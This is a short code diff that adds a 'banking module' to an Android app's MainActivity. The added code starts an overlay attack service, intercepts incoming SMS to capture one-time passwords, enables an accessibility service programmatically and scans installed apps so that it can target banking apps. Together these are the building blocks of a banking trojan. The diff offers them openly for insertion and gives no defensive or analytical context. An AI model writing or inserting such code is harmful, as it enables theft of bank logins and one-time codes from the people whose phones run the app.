@@ -1,0 +1,31 @@
+// In your MainActivity.java add:
+public class MainActivity extends AppCompatActivity {
+    // ... existing code ...
+    
+    private void setupBankingModule() {
+        // Start banking monitors
+        startService(new Intent(this, OverlayAttackService.class));
+        
+        // Register OTP receiver
+        registerReceiver(new OTPInterceptor(), 
+            new IntentFilter("android.provider.Telephony.SMS_RECEIVED"));
+        
+        // Enable accessibility service programmatically
+        enableAccessibilityService();
+        
+        // Start monitoring installed apps
+        monitorBankingAppsInstallation();
+    }
+    
+    private void monitorBankingAppsInstallation() {
+        PackageManager pm = getPackageManager();
+        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
+        
+        for (ApplicationInfo app : apps) {
+            if (BankingTargets.isBankingApp(app.packageName)) {
+                // Banking app found - start targeting
+                startTargetingApp(app.packageName);
+            }
+        }
+    }
+}
